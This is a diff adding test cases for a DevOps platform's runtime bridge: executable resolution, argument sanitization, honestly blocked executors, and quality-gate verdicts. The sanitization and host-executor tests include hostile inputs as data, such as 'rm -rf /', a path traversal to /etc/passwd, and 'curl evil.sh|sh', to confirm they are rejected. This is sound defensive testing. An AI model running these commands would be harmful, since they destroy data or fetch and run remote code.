@@ -31,6 +31,19 @@ import {
 } from "./cicd";
 import { ProjectDetector, type WsReader } from "./devops";
 import { parseIntent, generatePlan, executePlan } from "./engineering";
+import {
+  resolveExecutable,
+  sanitizeArgs,
+  BrowserProcessExecutor,
+  HostProcessExecutor,
+  PlaywrightAdapter,
+  SmokeTestService,
+  QualityGateService,
+  GATE_STAGES,
+  type HostBridge,
+  type GateStage,
+  type GateEvidence,
+} from "./runtime";
 import type { DetectionResult } from "./types";
 import type {
   AgentExecutionRecord,
@@ -1734,6 +1747,155 @@ export async function runPhase1Suite(): Promise<SuiteReport> {
         // a different identity cannot read it
         await expectThrow(() => services.workspaces.readFile(owner2User, plan.workspaceId, "package.json"), "denied");
         return `workspace ${plan.workspaceId} isolated`;
+      },
+    },
+
+    /* ----------------- Phase 3 Pass 5 — runtime bridge & smoke tests ---------------- */
+    {
+      category: "runtime-bridge",
+      name: "rt: executable resolution is platform-aware (Windows vs POSIX), never hardcoded to one OS",
+      fn: async () => {
+        assert(resolveExecutable("win32", "docker") === "docker.exe", "windows docker.exe");
+        assert(resolveExecutable("win32", "trivy") === "trivy.exe", "windows trivy.exe");
+        assert(resolveExecutable("win32", "npx") === "npx.cmd", "windows npx.cmd");
+        assert(resolveExecutable("linux", "docker") === "docker", "linux docker");
+        assert(resolveExecutable("darwin", "npx") === "npx", "macos npx");
+        return "win32→.exe/.cmd, posix→bare names";
+      },
+    },
+    {
+      category: "runtime-bridge",
+      name: "rt: argument sanitization rejects shell metacharacters and path traversal",
+      fn: async () => {
+        await expectThrow(async () => sanitizeArgs(["ok", "rm -rf /"]), "metacharacters");
+        await expectThrow(async () => sanitizeArgs(["../../etc/passwd"]), "traversal");
+        await expectThrow(async () => sanitizeArgs(["a;curl evil.sh|sh"]), "metacharacters");
+        const clean = sanitizeArgs(["--format", "json", "my-image:tag"]);
+        assert(clean.length === 3, "clean args pass through");
+        return "injection + traversal rejected";
+      },
+    },
+    {
+      category: "runtime-bridge",
+      name: "rt: managed browser executor reports BLOCKED and never pretends to execute",
+      fn: async () => {
+        const exec = new BrowserProcessExecutor();
+        const cap = exec.capability();
+        assert(cap.available === false, "managed runtime has no process execution");
+        assert(cap.kind === "MANAGED_BROWSER_RUNTIME", "reports managed mode");
+        await expectThrow(() => exec.run({ tool: "docker", operation: "version", args: [] }), "BLOCKED");
+        return "managed executor honestly BLOCKED";
+      },
+    },
+    {
+      category: "runtime-bridge",
+      name: "rt: host executor rejects untrusted raw scripts (only registered trusted scripts allowed)",
+      fn: async () => {
+        const fakeBridge: HostBridge = {
+          platform: () => "win32",
+          exec: async () => ({ exit_code: 0, stdout: "", stderr: "" }),
+        };
+        const hostExec = new HostProcessExecutor(fakeBridge);
+        // An attacker-supplied script must never reach the bridge.
+        await expectThrow(
+          () => hostExec.run({ tool: "node", operation: "-e", args: [], rawArgs: ["require('child_process').exec('rm -rf /')"] }),
+          "not a registered trusted script",
+        );
+        // Trusted scripts are only valid with `node -e`.
+        await expectThrow(
+          () => hostExec.run({ tool: "docker", operation: "version", args: [], rawArgs: ["anything"] }),
+          "node -e",
+        );
+        return "untrusted scripts + misuse rejected";
+      },
+    },
+    {
+      category: "runtime-bridge",
+      name: "rt: Playwright detection + smoke are BLOCKED in the managed runtime (never faked)",
+      fn: async () => {
+        const adapter = new PlaywrightAdapter(new BrowserProcessExecutor());
+        const det = await adapter.detect();
+        assert(det.playwright === false && det.chromium === false, "nothing detected in managed runtime");
+        assert(det.reason !== null, "honest reason provided");
+        const smoke = await adapter.smoke("http://localhost:8080");
+        assert(smoke.status === "BLOCKED", `smoke must be BLOCKED, got ${smoke.status}`);
+        assert(smoke.blocked_reason !== null, "blocked reason present");
+        assert(smoke.http_status === null && smoke.browser === null, "no invented browser/status");
+        return "playwright/chromium honestly BLOCKED";
+      },
+    },
+    {
+      category: "runtime-bridge",
+      name: "rt: smoke test service returns BLOCKED verdict when the runtime cannot execute (health + browser)",
+      fn: async () => {
+        const svc = new SmokeTestService(new BrowserProcessExecutor(), new PlaywrightAdapter(new BrowserProcessExecutor()), {
+          events: services.events,
+          audit: services.audit,
+        });
+        const res = await svc.run({ execution_id: null, staging_url: "http://localhost:9999" });
+        assert(res.verdict === "BLOCKED", `verdict must be BLOCKED, got ${res.verdict}`);
+        assert(res.health.ok === false, "health did not succeed");
+        assert(res.smoke.status === "BLOCKED", "smoke BLOCKED");
+        assert(res.reason !== null, "blocked reason present");
+        return "smoke verdict honestly BLOCKED";
+      },
+    },
+    {
+      category: "runtime-bridge",
+      name: "rt: quality gate returns VERIFIED only when all stages PASS (evidence-based)",
+      fn: async () => {
+        const qg = new QualityGateService({ events: services.events, audit: services.audit });
+        const all: Partial<Record<GateStage, GateEvidence>> = {};
+        for (const s of GATE_STAGES) all[s] = { status: "PASS", reason: null };
+        const res = await qg.evaluate("rt-gate-pass", all);
+        assert(res.verdict === "VERIFIED", `all-pass must be VERIFIED, got ${res.verdict}`);
+        assert(res.required_passed === GATE_STAGES.length, "all stages counted");
+        return `VERIFIED ${res.required_passed}/${res.required_total}`;
+      },
+    },
+    {
+      category: "runtime-bridge",
+      name: "rt: quality gate FAILED on any FAIL, BLOCKED on any BLOCKED — never silently PASS",
+      fn: async () => {
+        const qg = new QualityGateService({ events: services.events, audit: services.audit });
+        const mk = (over: Partial<Record<GateStage, GateEvidence>>) => {
+          const base: Partial<Record<GateStage, GateEvidence>> = {};
+          for (const s of GATE_STAGES) base[s] = { status: "PASS", reason: null };
+          return { ...base, ...over };
+        };
+        const failed = await qg.evaluate("rt-gate-fail", mk({ SMOKE: { status: "FAIL", reason: "page errors" } }));
+        assert(failed.verdict === "FAILED", `FAIL stage must yield FAILED, got ${failed.verdict}`);
+        assert(failed.blocking_stages.some((b) => b.stage === "SMOKE" && b.status === "FAILED"), "SMOKE recorded as blocking");
+        const blocked = await qg.evaluate("rt-gate-block", mk({ DOCKER: { status: "BLOCKED", reason: "no daemon" } }));
+        assert(blocked.verdict === "BLOCKED", `BLOCKED stage must yield BLOCKED (never VERIFIED), got ${blocked.verdict}`);
+        return "FAIL→FAILED, BLOCKED→BLOCKED";
+      },
+    },
+    {
+      category: "runtime-bridge",
+      name: "rt: quality gate treats missing evidence as BLOCKED (never assumes PASS)",
+      fn: async () => {
+        const qg = new QualityGateService({ events: services.events, audit: services.audit });
+        const partial: Partial<Record<GateStage, GateEvidence>> = { BUILD: { status: "PASS", reason: null } };
+        const res = await qg.evaluate("rt-gate-missing", partial);
+        assert(res.verdict === "BLOCKED", `missing evidence must be BLOCKED, got ${res.verdict}`);
+        assert(res.required_passed === 1, "only the supplied PASS counted");
+        return "absent stages default to BLOCKED";
+      },
+    },
+    {
+      category: "runtime-bridge",
+      name: "rt: quality gate evaluations are audited (real audit trail, distinct verdicts)",
+      fn: async () => {
+        const qg = new QualityGateService({ events: services.events, audit: services.audit });
+        const all: Partial<Record<GateStage, GateEvidence>> = {};
+        for (const s of GATE_STAGES) all[s] = { status: "PASS", reason: null };
+        await qg.evaluate("rt-gate-audit", all);
+        const audit = await services.audit.list(200);
+        const gates = audit.filter((a) => a.action === "quality_gate.evaluated");
+        assert(gates.length > 0, "gate evaluations audited");
+        assert(gates.some((a) => a.result === "allow"), "VERIFIED audited as allow");
+        return `${gates.length} gate audit records`;
       },
     },
   ];
